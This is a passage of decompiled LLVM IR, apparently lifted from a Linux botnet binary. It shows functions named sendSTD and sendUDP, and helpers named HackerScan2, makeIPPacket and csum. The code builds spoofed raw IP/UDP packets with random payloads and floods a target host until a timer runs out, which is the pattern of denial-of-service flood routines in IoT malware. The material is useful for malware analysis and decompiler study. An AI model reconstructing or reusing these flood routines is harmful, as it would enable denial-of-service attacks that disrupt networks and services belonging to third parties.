  %v1_fdb0 = call i32 @__libc_close(i32 %v5_fd74)
  br label %dec_label_pc_fdb4

dec_label_pc_fdb4:                                ; preds = %dec_label_pc_fd58, %dec_label_pc_fd8c, %dec_label_pc_fdb4.preheader
  %v2_fdb8 = call i32 @__GI_time(i32* null)
  %v5_fdc8 = icmp slt i32 %v2_fdb8, %v2_fca0
  br i1 %v5_fdc8, label %dec_label_pc_fd58, label %dec_label_pc_fdcc

dec_label_pc_fdcc:                                ; preds = %dec_label_pc_fdb4
  %v1_fdd0 = call i32 @__GI__exit(i32 1)
  unreachable

dec_label_pc_fde0:                                ; preds = %dec_label_pc_fd44, %entry
  %v12_fdf4 = phi i32 [ %v3_fd34, %entry ], [ 0, %dec_label_pc_fd44 ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_fdd8, %dec_label_pc_fd44 ]
  %v5_fdec = icmp slt i32 %storemerge2, %arg6
  br i1 %v5_fdec, label %dec_label_pc_fd44, label %dec_label_pc_fdf0

dec_label_pc_fdf0:                                ; preds = %dec_label_pc_fde0
  %v2_fdf4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_fdf4, i32* @r4, align 4
  store i32 %v6_fc40, i32* @fp, align 4
  ret i32 %v12_fdf4

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %v5_fd74, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_fdb4, { 1, 0, 2 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fe08 = load i32, i32* @fp, align 4
  store i32 %v3_fe08, i32* %stack_var_-16, align 4
  store i32 65040, i32* %stack_var_-4, align 4
  %v13_fe08 = ptrtoint i32* %stack_var_-16 to i32
  %v2_fe0c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fe0c, i32* @fp, align 4
  store i32 %arg3, i32* %stack_var_-208, align 4
  %v0_fe2c = call i32 @socket()
  %v2_fe3c = call i32 @__GI_time(i32* null)
  %v1_fe50 = call i32 @__GI_gethostbyname(i32 %arg1)
  store i32 16, i32* @r2, align 4
  %v2_fe6c = bitcast i32* %stack_var_-52 to i8*
  %v3_fe6c = call i32 @__GI_memset(i8* %v2_fe6c, i32 0)
  %v1_fe74 = add i32 %v1_fe50, 16
  %v2_fe74 = inttoptr i32 %v1_fe74 to i32*
  %v3_fe74 = load i32, i32* %v2_fe74, align 4
  %v1_fe78 = inttoptr i32 %v3_fe74 to i32*
  %v2_fe78 = load i32, i32* %v1_fe78, align 4
  %v2_fe80 = ptrtoint i32* %stack_var_-48 to i32
  %v1_fe88 = add i32 %v1_fe50, 12
  %v2_fe88 = inttoptr i32 %v1_fe88 to i32*
  %v3_fe88 = load i32, i32* %v2_fe88, align 4
  store i32 %v3_fe88, i32* @r2, align 4
  %v3_fe98 = call i32 @bcopy(i32 %v2_fe78, i32 %v2_fe80, i32 %v3_fe88)
  %v1_fea0 = add i32 %v1_fe50, 8
  %v2_fea0 = inttoptr i32 %v1_fea0 to i32*
  %v3_fea0 = load i32, i32* %v2_fea0, align 4
  %v3_fea8 = urem i32 %v3_fea0, 65536
  store i32 %v3_fea8, i32* %stack_var_-52, align 4
  %v2_fedc = ptrtoint i32* %stack_var_-196 to i32
  %v3_ff58 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v2_ff18 = add i32 %v13_fe08, -180
  br label %dec_label_pc_fed8

dec_label_pc_fed8:                                ; preds = %dec_label_pc_ff94, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_ff98, %dec_label_pc_ff94 ]
  store i32 %v2_fedc, i32* @r0, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_21670.1173 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_fef0 = call i32 @memcpy()
  %v0_fef4 = call i32 @random()
  %tmp = icmp ult i32 %storemerge3, 50
  br i1 %tmp, label %dec_label_pc_ff94, label %dec_label_pc_ff34

dec_label_pc_ff34:                                ; preds = %dec_label_pc_fed8
  %v2_ff04 = urem i32 %v0_fef4, 36
  %v3_ff10 = mul nuw nsw i32 %v2_ff04, 4
  %v2_ff1c = add i32 %v2_ff18, %v3_ff10
  %v1_ff20 = inttoptr i32 %v2_ff1c to i32*
  %v2_ff20 = load i32, i32* %v1_ff20, align 4
  %v5_ff44 = inttoptr i32 %v2_ff20 to i32*
  %v6_ff44 = call i32 @__libc_send(i32 %v0_fe2c, i32* %v5_ff44, i32 75, i32 0)
  %v4_ff58 = call i32 @__libc_connect(i32 %v0_fe2c, %sockaddr* %v3_ff58, i32 16)
  %v2_ff60 = call i32 @__GI_time(i32* null)
  %v3_ff6c = load i32, i32* %stack_var_-208, align 4
  %v2_ff70 = add i32 %v3_ff6c, %v2_fe3c
  %v5_ff78 = icmp slt i32 %v2_ff60, %v2_ff70
  br i1 %v5_ff78, label %dec_label_pc_ff8c, label %dec_label_pc_ff7c

dec_label_pc_ff7c:                                ; preds = %dec_label_pc_ff34
  %v1_ff80 = call i32 @__libc_close(i32 %v0_fe2c)
  %v1_ff88 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_ff8c:                                ; preds = %dec_label_pc_ff34
  br label %dec_label_pc_ff94

dec_label_pc_ff94:                                ; preds = %dec_label_pc_fed8, %dec_label_pc_ff8c
  %stack_var_-24.0 = phi i32 [ %storemerge3, %dec_label_pc_fed8 ], [ 0, %dec_label_pc_ff8c ]
  %v1_ff98 = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_fed8

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v3_fe88, { 1, 0 }
  uselistorder i32 %v1_fe50, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 2, 1 }
  uselistorder i32 50, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ff94, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_ffac = load i32, i32* @r4, align 4
  %v6_ffac = load i32, i32* @fp, align 4
  store i32 65460, i32* %stack_var_-4, align 4
  %v2_ffb0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ffb0, i32* @fp, align 4
  %v2_ffb4 = ptrtoint i32* %stack_var_-136 to i32
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_ffdc = icmp eq i32 %arg2, 0
  br i1 %v2_ffdc, label %dec_label_pc_ffe4, label %dec_label_pc_10004

dec_label_pc_ffe4:                                ; preds = %entry
  %v0_ffe4 = call i32 @rand_cmwc()
  %v3_ffec = mul i32 %v0_ffe4, 65536
  store i32 %v3_ffec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10028

dec_label_pc_10004:                               ; preds = %entry
  %v3_1000c = urem i32 %arg2, 65536
  store i32 %v3_1000c, i32* %r3.global-to-local, align 4
  %v1_10014 = call i32 @htons(i32 %v3_1000c)
  br label %dec_label_pc_10028

dec_label_pc_10028:                               ; preds = %dec_label_pc_ffe4, %dec_label_pc_10004
  %v2_1002c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1002c, i32* %r3.global-to-local, align 4
  %v3_10038 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-72)
  store i32 %v3_10038, i32* %r3.global-to-local, align 4
  %v2_10040 = icmp eq i32 %v3_10038, 0
  br i1 %v2_10040, label %dec_label_pc_10048, label %dec_label_pc_105f4

dec_label_pc_10048:                               ; preds = %dec_label_pc_10028
  %v2_10048 = ptrtoint i32* %stack_var_-76 to i32
  %v2_1004c = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_1004c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-68, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v7_1006c = icmp eq i32 %arg4, 32
  br i1 %v7_1006c, label %dec_label_pc_10074, label %dec_label_pc_101b4

dec_label_pc_10074:                               ; preds = %dec_label_pc_10048
  store i32 17, i32* @r2, align 4
  %v0_10080 = call i32 @socket()
  store i32 %v0_10080, i32* %r3.global-to-local, align 4
  %v2_10090 = icmp eq i32 %v0_10080, 0
  br i1 %v2_10090, label %dec_label_pc_10098, label %dec_label_pc_100b0

dec_label_pc_10098:                               ; preds = %dec_label_pc_10074
  %v2_1009c = load i32, i32* @global_var_2b5d0.55, align 4
  store i32 %v2_1009c, i32* %r3.global-to-local, align 4
  %v3_100a8 = call i32 @HackerPrint(i32 %v2_1009c, i32 ptrtoint ([27 x i8]* @global_var_21700.1176 to i32))
  br label %dec_label_pc_105f4

dec_label_pc_100b0:                               ; preds = %dec_label_pc_10074
  %v3_100b0 = load i32, i32* %stack_var_0, align 4
  %v1_100b4 = add i32 %v3_100b0, 1
  store i32 %v1_100b4, i32* %r3.global-to-local, align 4
  %v1_100bc = call i32 @malloc(i32 %v1_100b4)
  store i32 %v1_100bc, i32* %r3.global-to-local, align 4
  %v2_100cc = icmp eq i32 %v1_100bc, 0
  br i1 %v2_100cc, label %dec_label_pc_105f4, label %dec_label_pc_100d4

dec_label_pc_100d4:                               ; preds = %dec_label_pc_100b0
  %v3_100d4 = load i32, i32* %stack_var_0, align 4
  %v1_100d8 = add i32 %v3_100d4, 1
  store i32 %v1_100d8, i32* @r2, align 4
  store i32 %v1_100bc, i32* %r3.global-to-local, align 4
  %v2_100ec = inttoptr i32 %v1_100bc to i8*
  %v3_100ec = call i32 @__GI_memset(i8* %v2_100ec, i32 0)
  %v2_100f8 = call i32 @makeRandomStr(i32 %v1_100bc, i32 %v3_100d4)
  %v2_10100 = call i32 @__GI_time(i32* null)
  %v2_1010c = add i32 %v2_10100, %arg3
  store i32 %v2_1010c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v6_10144 = inttoptr i32 %v1_100bc to i32*
  br label %dec_label_pc_10120

dec_label_pc_10120:                               ; preds = %dec_label_pc_101a4, %dec_label_pc_10198, %dec_label_pc_100d4
  %stack_var_-104.0 = phi i32 [ 0, %dec_label_pc_100d4 ], [ 0, %dec_label_pc_10198 ], [ %v1_101a8, %dec_label_pc_101a4 ]
  %v3_10120 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_10048, i32* %stack_var_-136, align 4
  store i32 %v3_10120, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_10144 = call i32 @__libc_sendto(i32 %v0_10080, i32* %v6_10144, i32 %v3_10120, i32 0, i32 %v2_10048, i32 16)
  store i32 %stack_var_-104.0, i32* %r3.global-to-local, align 4
  %v9_10150 = icmp eq i32 %stack_var_-104.0, %arg6
  br i1 %v9_10150, label %dec_label_pc_10158, label %dec_label_pc_101a4

dec_label_pc_10158:                               ; preds = %dec_label_pc_10120
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_ffdc, label %dec_label_pc_10164, label %dec_label_pc_10180

dec_label_pc_10164:                               ; preds = %dec_label_pc_10158
  %v0_10164 = call i32 @rand_cmwc()
  %v3_10170 = udiv i32 %v0_10164, 256
  %v3_101785 = urem i32 %v3_10170, 256
  store i32 %v3_101785, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10180

dec_label_pc_10180:                               ; preds = %dec_label_pc_10158, %dec_label_pc_10164
  %v2_10184 = call i32 @__GI_time(i32* null)
  store i32 %v2_10184, i32* %r2.global-to-local, align 4
  store i32 %v2_1010c, i32* %r3.global-to-local, align 4
  %v8_10194 = icmp sgt i32 %v2_10184, %v2_1010c
  br i1 %v8_10194, label %dec_label_pc_105f4, label %dec_label_pc_10198

dec_label_pc_10198:                               ; preds = %dec_label_pc_10180
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10120

dec_label_pc_101a4:                               ; preds = %dec_label_pc_10120
  %v1_101a8 = add i32 %stack_var_-104.0, 1
  store i32 %v1_101a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10120

dec_label_pc_101b4:                               ; preds = %dec_label_pc_10048
  store i32 %v2_ffb4, i32* %r3.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v0_101c8 = call i32 @socket()
  store i32 %v0_101c8, i32* %r3.global-to-local, align 4
  %v2_101d8 = icmp eq i32 %v0_101c8, 0
  br i1 %v2_101d8, label %dec_label_pc_101e0, label %dec_label_pc_101f8

dec_label_pc_101e0:                               ; preds = %dec_label_pc_101b4
  %v2_101e4 = load i32, i32* @global_var_2b5d0.55, align 4
  store i32 %v2_101e4, i32* %r3.global-to-local, align 4
  %v3_101f0 = call i32 @HackerPrint(i32 %v2_101e4, i32 ptrtoint ([27 x i8]* @global_var_21700.1176 to i32))
  br label %dec_label_pc_105f0

dec_label_pc_101f8:                               ; preds = %dec_label_pc_101b4
  store i32 1, i32* %stack_var_-80, align 4
  %v2_10200 = ptrtoint i32* %stack_var_-80 to i32
  store i32 4, i32* %stack_var_-136, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_10200, i32* %r3.global-to-local, align 4
  %v6_1021c = call i32 @__GI_setsockopt(i32 %v0_101c8, i32 0, i32 3, i32* nonnull %stack_var_-80, i32 4)
  store i32 %v6_1021c, i32* %r3.global-to-local, align 4
  %v1_10224 = icmp slt i32 %v6_1021c, 0
  br i1 %v1_10224, label %dec_label_pc_1022c, label %dec_label_pc_10244

dec_label_pc_1022c:                               ; preds = %dec_label_pc_101f8
  %v2_10230 = load i32, i32* @global_var_2b5d0.55, align 4
  store i32 %v2_10230, i32* %r3.global-to-local, align 4
  %v3_1023c = call i32 @HackerPrint(i32 %v2_10230, i32 ptrtoint ([33 x i8]* @global_var_2171c.1178 to i32))
  br label %dec_label_pc_105f0

dec_label_pc_10244:                               ; preds = %dec_label_pc_101f8
  store i32 49, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10250

dec_label_pc_10250:                               ; preds = %dec_label_pc_10244, %dec_label_pc_10250
  %v1_1028824 = phi i32 [ 49, %dec_label_pc_10244 ], [ %v1_10288, %dec_label_pc_10250 ]
  %v2_10254 = call i32 @__GI_time(i32* null)
  store i32 %v2_10254, i32* %r3.global-to-local, align 4
  store i32 %v2_10254, i32* @r4, align 4
  %v0_10260 = call i32 @rand_cmwc()
  %v0_10268 = load i32, i32* @r4, align 4
  %v2_10268 = xor i32 %v0_10268, %v0_10260
  store i32 %v2_10268, i32* %r3.global-to-local, align 4
  %v1_10270 = call i32 @srand(i32 %v2_10268)
  %v0_10274 = call i32 @random()
  store i32 %v0_10274, i32* %r3.global-to-local, align 4
  %v1_10280 = call i32 @init_rand(i32 %v0_10274)
  %v1_10288 = add nsw i32 %v1_1028824, -1
  store i32 %v1_10288, i32* %r3.global-to-local, align 4
  %v3_10294 = icmp eq i32 %v1_1028824, 0
  br i1 %v3_10294, label %dec_label_pc_1029c, label %dec_label_pc_10250

dec_label_pc_1029c:                               ; preds = %dec_label_pc_10250
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_102a0 = icmp eq i32 %arg4, 0
  br i1 %v2_102a0, label %dec_label_pc_102cc, label %dec_label_pc_102b4

dec_label_pc_102b4:                               ; preds = %dec_label_pc_1029c
  %v1_102b8 = sub i32 32, %arg4
  store i32 %v1_102b8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_102c4 = shl i32 -1, %v1_102b8
  br label %dec_label_pc_102cc

dec_label_pc_102cc:                               ; preds = %dec_label_pc_1029c, %dec_label_pc_102b4
  %storemerge12 = phi i32 [ %v1_102c4, %dec_label_pc_102b4 ], [ 0, %dec_label_pc_1029c ]
  %v3_102cc = load i32, i32* %stack_var_0, align 4
  %v1_102d0 = add i32 %v3_102cc, 28
  %v1_102e0 = add i32 %v3_102cc, 34
  %v3_102e4 = and i32 %v1_102e0, -4
  %v1_102ec = load i32, i32* @sp, align 4
  %v2_102ec = sub i32 %v1_102ec, %v3_102e4
  %v1_102f0 = add i32 %v2_102ec, 8
  store i32 %v1_102f0, i32* %r2.global-to-local, align 4
  %v1_102fc = add i32 %v2_102ec, 11
  %v3_10300 = and i32 %v1_102fc, -4
  %v1_10320 = add i32 %v3_10300, 20
  store i32 %v1_10320, i32* %r3.global-to-local, align 4
  %v5_10324 = inttoptr i32 %v1_10320 to i8*
  %v3_10328 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_10328, i32* @r4, align 4
  %v1_10330 = call i32 @HackerScan2(i32 %storemerge12)
  store i32 %v1_10330, i32* %r3.global-to-local, align 4
  %v1_1033c = call i32 @htonl(i32 %v1_10330)
  store i32 %v1_1033c, i32* %r2.global-to-local, align 4
  %v3_10344 = load i32, i32* %stack_var_0, align 4
  %v1_10348 = add i32 %v3_10344, 8
  %v1_1034c = load i32, i32* @sp, align 4
  %v2_1034c = inttoptr i32 %v1_1034c to i32*
  store i32 %v1_10348, i32* %v2_1034c, align 4
  %v0_10354 = load i32, i32* @r4, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v4_1035c = inttoptr i32 %v3_10300 to i8*
  %v5_1035c = call i32 @makeIPPacket(i8* %v4_1035c, i32 %v0_10354, i32 %v1_1033c, i32 17)
  %v3_10360 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_10360, 8
  %v3_10374 = urem i32 %fold, 65536
  store i32 %v3_10374, i32* %r3.global-to-local, align 4
  %v1_1037c = call i32 @htons(i32 %v3_10374)
  %sext = mul i32 %v1_1037c, 16777216
  %v1_10380 = sdiv i32 %sext, 16777216
  store i32 %v1_10380, i32* %r3.global-to-local, align 4
  store i32 %v1_10320, i32* %r2.global-to-local, align 4
  %v1_10388 = trunc i32 %v1_10380 to i8
  %v3_10388 = add i32 %v3_10300, 24
  %v4_10388 = inttoptr i32 %v3_10388 to i8*
  store i8 %v1_10388, i8* %v4_10388, align 4
  %v0_1038c = load i32, i32* %r3.global-to-local, align 4
  %v3_1038c = sdiv i32 %v0_1038c, 256
  store i32 %v3_1038c, i32* %r3.global-to-local, align 4
  %v1_10390 = trunc i32 %v3_1038c to i8
  %v2_10390 = load i32, i32* %r2.global-to-local, align 4
  %v3_10390 = add i32 %v2_10390, 5
  %v4_10390 = inttoptr i32 %v3_10390 to i8*
  store i8 %v1_10390, i8* %v4_10390, align 1
  %v0_10394 = call i32 @rand_cmwc()
  %v3_103a0 = urem i32 %v0_10394, 65536
  store i32 %v3_103a0, i32* %r3.global-to-local, align 4
  store i32 %v1_10320, i32* %r2.global-to-local, align 4
  %v1_103a8 = trunc i32 %v0_10394 to i8
  store i8 %v1_103a8, i8* %v5_10324, align 4
  %v0_103ac = load i32, i32* %r3.global-to-local, align 4
  %v3_103ac32 = udiv i32 %v0_103ac, 256
  %v1_103b0 = trunc i32 %v3_103ac32 to i8
  %v2_103b0 = load i32, i32* %r2.global-to-local, align 4
  %v3_103b0 = add i32 %v2_103b0, 1
  %v4_103b0 = inttoptr i32 %v3_103b0 to i8*
  store i8 %v1_103b0, i8* %v4_103b0, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_ffdc, label %dec_label_pc_103c0, label %dec_label_pc_103d8

dec_label_pc_103c0:                               ; preds = %dec_label_pc_102cc
  %v0_103c0 = call i32 @rand_cmwc()
  %v3_103c8 = mul i32 %v0_103c0, 65536
  store i32 %v3_103c8, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_103c0 to i8
  br label %dec_label_pc_103f4

dec_label_pc_103d8:                               ; preds = %dec_label_pc_102cc
  %v3_103e0 = urem i32 %arg2, 65536
  store i32 %v3_103e0, i32* %r3.global-to-local, align 4
  %v1_103e8 = call i32 @htons(i32 %v3_103e0)
  %extract.t90 = trunc i32 %v1_103e8 to i8
  br label %dec_label_pc_103f4

dec_label_pc_103f4:                               ; preds = %dec_label_pc_103c0, %dec_label_pc_103d8
  %v0_103c0.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_103c0 ], [ %extract.t90, %dec_label_pc_103d8 ]
  %v3_10504.pre-phi = phi i32 [ 0, %dec_label_pc_103c0 ], [ %v3_103e0, %dec_label_pc_103d8 ]
  store i32 %v1_10320, i32* %r2.global-to-local, align 4
  %v4_103f8 = sext i8 %v0_103c0.sink.off0 to i32
  %v3_103fc = add i32 %v3_10300, 22
  %v4_103fc = inttoptr i32 %v3_103fc to i8*
  store i8 %v0_103c0.sink.off0, i8* %v4_103fc, align 2
  %v3_1040436 = udiv i32 %v4_103f8, 256
  %v1_10408 = trunc i32 %v3_1040436 to i8
  %v2_10408 = load i32, i32* %r2.global-to-local, align 4
  %v3_10408 = add i32 %v2_10408, 3
  %v4_10408 = inttoptr i32 %v3_10408 to i8*
  store i8 %v1_10408, i8* %v4_10408, align 1
  store i32 %v1_10320, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_10414 = add i32 %v3_10300, 26
  %v4_10414 = inttoptr i32 %v3_10414 to i8*
  store i8 0, i8* %v4_10414, align 2
  %v0_10418 = load i32, i32* %r3.global-to-local, align 4
  %v1_10418 = trunc i32 %v0_10418 to i8
  %v2_10418 = load i32, i32* %r2.global-to-local, align 4
  %v3_10418 = add i32 %v2_10418, 7
  %v4_10418 = inttoptr i32 %v3_10418 to i8*
  store i8 %v1_10418, i8* %v4_10418, align 1
  %v1_10420 = add i32 %v3_10300, 28
  store i32 %v1_10420, i32* %r3.global-to-local, align 4
  %v3_10428 = load i32, i32* %stack_var_0, align 4
  %v2_1042c = call i32 @makeRandomStr(i32 %v1_10420, i32 %v3_10428)
  %v1_1043c = or i32 %v3_10300, 2
  store i32 %v1_1043c, i32* %r3.global-to-local, align 4
  %v1_10440 = inttoptr i32 %v1_1043c to i8*
  %v2_10440 = load i8, i8* %v1_10440, align 2
  %v3_10440 = zext i8 %v2_10440 to i32
  store i32 %v3_10440, i32* %r2.global-to-local, align 4
  %v1_10444 = or i32 %v1_102fc, 3
  %v2_10444 = inttoptr i32 %v1_10444 to i8*
  %v3_10444 = load i8, i8* %v2_10444, align 1
  %v4_10444 = zext i8 %v3_10444 to i32
  %v4_10448 = mul nuw nsw i32 %v4_10444, 256
  %v5_10448 = or i32 %v4_10448, %v3_10440
  store i32 %v5_10448, i32* %r3.global-to-local, align 4
  %v3_10454 = call i32 @csum(i8* %v4_1035c, i32 %v5_10448)
  %sext6 = mul i32 %v3_10454, 16777216
  %v1_10458 = sdiv i32 %sext6, 16777216
  store i32 %v1_10458, i32* %r3.global-to-local, align 4
  store i32 %v3_10300, i32* %r2.global-to-local, align 4
  %v1_10460 = trunc i32 %v1_10458 to i8
  %v3_10460 = add i32 %v3_10300, 10
  %v4_10460 = inttoptr i32 %v3_10460 to i8*
  store i8 %v1_10460, i8* %v4_10460, align 2
  %v0_10464 = load i32, i32* %r3.global-to-local, align 4
  %v3_10464 = sdiv i32 %v0_10464, 256
  store i32 %v3_10464, i32* %r3.global-to-local, align 4
  %v1_10468 = trunc i32 %v3_10464 to i8
  %v2_10468 = load i32, i32* %r2.global-to-local, align 4
  %v3_10468 = add i32 %v2_10468, 11
  %v4_10468 = inttoptr i32 %v3_10468 to i8*
  store i8 %v1_10468, i8* %v4_10468, align 1
  %v2_10470 = call i32 @__GI_time(i32* null)
  %v2_1047c = add i32 %v2_10470, %arg3
  store i32 %v2_1047c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_10544 = add i32 %v3_10300, 4
  %v4_10544 = inttoptr i32 %v3_10544 to i8*
  %v2_1056c = add i32 %v3_10300, 12
  %v3_1056c = inttoptr i32 %v2_1056c to i32*
  br label %dec_label_pc_10490

dec_label_pc_10490:                               ; preds = %dec_label_pc_105e0, %dec_label_pc_105d4, %dec_label_pc_103f4
  %stack_var_-100.0 = phi i32 [ 0, %dec_label_pc_103f4 ], [ 0, %dec_label_pc_105d4 ], [ %v1_105e4, %dec_label_pc_105e0 ]
  store i32 %v3_10300, i32* %r2.global-to-local, align 4
  %v1_10498 = load i32, i32* @sp, align 4
  %v2_10498 = inttoptr i32 %v1_10498 to i32*
  store i32 %v2_10048, i32* %v2_10498, align 4
  %v1_104a0 = load i32, i32* @sp, align 4
  %v2_104a0 = add i32 %v1_104a0, 4
  %v3_104a0 = inttoptr i32 %v2_104a0 to i32*
  store i32 16, i32* %v3_104a0, align 4
  %v0_104a8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_102d0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_104b4 = inttoptr i32 %v0_104a8 to i32*
  %v7_104b4 = call i32 @__libc_sendto(i32 %v0_101c8, i32* %v6_104b4, i32 %v1_102d0, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_104b8 = call i32 @rand_cmwc()
  %v3_104c4 = urem i32 %v0_104b8, 65536
  store i32 %v3_104c4, i32* %r3.global-to-local, align 4
  store i32 %v1_10320, i32* %r2.global-to-local, align 4
  %v1_104cc = trunc i32 %v0_104b8 to i8
  store i8 %v1_104cc, i8* %v5_10324, align 4
  %v0_104d0 = load i32, i32* %r3.global-to-local, align 4
  %v3_104d037 = udiv i32 %v0_104d0, 256
  %v1_104d4 = trunc i32 %v3_104d037 to i8
  %v2_104d4 = load i32, i32* %r2.global-to-local, align 4
  %v3_104d4 = add i32 %v2_104d4, 1
  %v4_104d4 = inttoptr i32 %v3_104d4 to i8*
  store i8 %v1_104d4, i8* %v4_104d4, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_ffdc, label %dec_label_pc_104e4, label %dec_label_pc_104fc

dec_label_pc_104e4:                               ; preds = %dec_label_pc_10490
  %v0_104e4 = call i32 @rand_cmwc()
  %v3_104ec = mul i32 %v0_104e4, 65536
  store i32 %v3_104ec, i32* %r3.global-to-local, align 4
  %extract.t91 = trunc i32 %v0_104e4 to i8
  br label %dec_label_pc_10518

dec_label_pc_104fc:                               ; preds = %dec_label_pc_10490
  store i32 %v3_10504.pre-phi, i32* %r3.global-to-local, align 4
  %v1_1050c = call i32 @htons(i32 %v3_10504.pre-phi)
  %extract.t92 = trunc i32 %v1_1050c to i8
  br label %dec_label_pc_10518

dec_label_pc_10518:                               ; preds = %dec_label_pc_104e4, %dec_label_pc_104fc
  %v0_104e4.sink.off0 = phi i8 [ %extract.t91, %dec_label_pc_104e4 ], [ %extract.t92, %dec_label_pc_104fc ]
  store i32 %v1_10320, i32* %r2.global-to-local, align 4
  %v4_1051c = sext i8 %v0_104e4.sink.off0 to i32
  store i8 %v0_104e4.sink.off0, i8* %v4_103fc, align 2
  %v3_10528 = sdiv i32 %v4_1051c, 256
  store i32 %v3_10528, i32* %r3.global-to-local, align 4
  %v1_1052c = trunc i32 %v3_10528 to i8
  %v2_1052c = load i32, i32* %r2.global-to-local, align 4
  %v3_1052c = add i32 %v2_1052c, 3
  %v4_1052c = inttoptr i32 %v3_1052c to i8*
  store i8 %v1_1052c, i8* %v4_1052c, align 1
  %v0_10530 = call i32 @rand_cmwc()
  %v3_1053c = urem i32 %v0_10530, 65536
  store i32 %v3_1053c, i32* %r3.global-to-local, align 4
  store i32 %v3_10300, i32* %r2.global-to-local, align 4
  %v1_10544 = trunc i32 %v0_10530 to i8
  store i8 %v1_10544, i8* %v4_10544, align 4
  %v0_10548 = load i32, i32* %r3.global-to-local, align 4
  %v3_10548 = sdiv i32 %v0_10548, 256
  store i32 %v3_10548, i32* %r3.global-to-local, align 4
  %v1_1054c = trunc i32 %v3_10548 to i8
  %v2_1054c = load i32, i32* %r2.global-to-local, align 4
  %v3_1054c = add i32 %v2_1054c, 5
  %v4_1054c = inttoptr i32 %v3_1054c to i8*
  store i8 %v1_1054c, i8* %v4_1054c, align 1
  %v1_10554 = call i32 @HackerScan2(i32 %storemerge12)
  store i32 %v1_10554, i32* %r3.global-to-local, align 4
  %v1_10560 = call i32 @htonl(i32 %v1_10554)
  store i32 %v1_10560, i32* %r2.global-to-local, align 4
  store i32 %v1_10560, i32* %v3_1056c, align 4
  store i32 %v1_1043c, i32* %r3.global-to-local, align 4
  %v2_10580 = load i8, i8* %v1_10440, align 2
  %v3_10580 = zext i8 %v2_10580 to i32
  store i32 %v3_10580, i32* %r2.global-to-local, align 4
  %v3_10584 = load i8, i8* %v2_10444, align 1
  %v4_10584 = zext i8 %v3_10584 to i32
  %v4_10588 = mul nuw nsw i32 %v4_10584, 256
